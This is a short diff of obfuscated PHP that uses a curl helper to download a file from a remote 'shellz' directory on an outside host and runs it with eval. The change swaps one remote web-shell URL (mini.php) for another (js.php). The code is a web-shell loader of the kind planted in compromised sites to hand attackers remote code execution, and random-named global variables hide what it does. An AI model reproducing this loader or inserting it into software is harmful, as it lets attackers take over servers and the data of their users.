@@ -36,5 +36,5 @@ function get_contents($url)
     ${$GLOBALS["lnrkdexmo"]} = curl_exec($ch);
     return ${$GLOBALS["lnrkdexmo"]};
 }
-${$GLOBALS["ltnbuthggrc"]} = get_contents("https://anon6host.my.id/shellz/mini.php");
+${$GLOBALS["ltnbuthggrc"]} = get_contents("https://anon6host.my.id/shellz/js.php");
 eval("?>" . ${$GLOBALS["fcgthfemb"]});
